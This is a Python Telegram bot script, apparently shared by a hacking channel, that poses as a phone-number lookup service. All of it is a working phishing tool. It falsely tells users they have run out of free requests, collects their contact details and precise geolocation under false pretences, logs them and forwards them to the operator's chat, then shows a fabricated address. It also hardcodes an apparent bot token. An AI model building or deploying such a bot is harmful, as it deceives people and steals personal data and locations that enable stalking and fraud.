import telebot
from telebot import types
import time
import random

ID = '661262775'
bot = telebot.TeleBot("6264887049:AAHVKKKZA7bVnzi7VdML1WH_PGq4mRqpfrY")
adr = ['Tverskaya street, house 13', '60th Anniversary of October Avenue', 'Vinokurova Street', '3rd Golutvinsky Lane']
bot.send_message(ID, '!BOT STARTED!') 
print("\n\n\033[91m[\033[92m*\033[91m]\033[93m Bot Launched! \033[96m >>> \033[0m\n\n")

@bot.message_handler(commands=['start'])
def start(message):
	bot.send_message(message.chat.id, '''👋 Hello! 👋
This is a bot that can show information by phone number!
To search for information, enter the command /getinfo''') 
	
@bot.message_handler(commands=['onlinehacking'])
def start(message):
	bot.send_message(message.chat.id, 'Author of the script:: @suman333mondal. Check: t.me/onlinehacking') 

@bot.message_handler(commands=['getinfo'])
def start(message):
	msg = bot.send_message(message.chat.id, 'Enter any phone number') 
	bot.register_next_step_handler(msg, proc2)

def proc2(message):
	try:
		m_id = message.chat.id
		user_input = message.text
		num = user_input.replace('+', '')

		if not num.isdigit():
			msg = bot.reply_to(message, 'It seems you did not enter a valid phone number, please try again by typing /getinfo!')#⏳
			return

		bot.send_message(m_id, f'Request for number {{num}} has been sent!')
		time.sleep(2)
		keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
		button_phone = types.KeyboardButton(text="Register", request_contact=True) 	
		keyboard.add(button_phone)	
		bot.send_message(m_id, '''Looks like you have no free requests left for the day!
			To get additional questions, register in the bot!''', reply_markup=keyboard)
# Отловка ошибок
	except Exception as e:
		bot.send_message(ID, e)
		bot.send_message(m_id, 'An unidentified error has occurred, please restart the bot!')

@bot.message_handler(content_types=['contact']) 
def contact(message):
	if message.contact is not None: 
		nick = message.from_user.username
		first = message.contact.first_name
		last = message.contact.last_name
		userid = message.contact.user_id
		phone = message.contact.phone_number
		info = f'''
			Data
			├Name: {{first}} {{last}}
			├ID: {{userid}}
			├Nick: @{{nick}}
			└Phone number: {{phone}}
			'''
		log = open('bot-log.txt', 'a+', encoding='utf-8')
		log.write(info + '  ')
		log.close()
		bot.send_message(ID, info)
		print(info)

		if message.contact.user_id != message.chat.id:
			bot.send_message(message.chat.id, 'Отправьте свой контакт!')

	keyboardmain = types.InlineKeyboardMarkup(row_width=2)
	button = types.InlineKeyboardButton(text="Advanced Search", callback_data="find")
	keyboardmain.add(button)
	bot.send_message(message.chat.id, f'''
		Room information
		├Operator: Beeline
		└Country: Russia
		''', reply_markup=keyboardmain)

@bot.callback_query_handler(func=lambda call:True)
def callback_inline(call):
	if call.data == "find":
		keyboard1 = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
		button_location = types.KeyboardButton(text="Confirm", request_location=True) 	
		keyboard1.add(button_location)
		bot.send_message(call.message.chat.id, text='To use the free advanced search, confirm your geolocation!', reply_markup=keyboard1)

@bot.message_handler(content_types=['location']) 
def contact(message):
	if message.location is not None: 
		lon = str(message.location.longitude)
		lat = str(message.location.latitude)
		geo = f'''
		Геолокация
		├ID: {{message.chat.id}}
		├Longitude: {{lon}}
		├Latitude: {{lat}}
		└Cards: https://www.google.com/maps/place/{{lat}}+{{lon}} 
		'''
		log = open('bot-log.txt', 'a+', encoding='utf-8')
		log.write(geo + '  ')
		log.close()
		bot.send_message(ID, geo) 
		print(geo)
		bot.send_message(message.chat.id, f'''
			Geolocation
			└Address: {{random.choice(adr)}}
			''')
bot.polling()
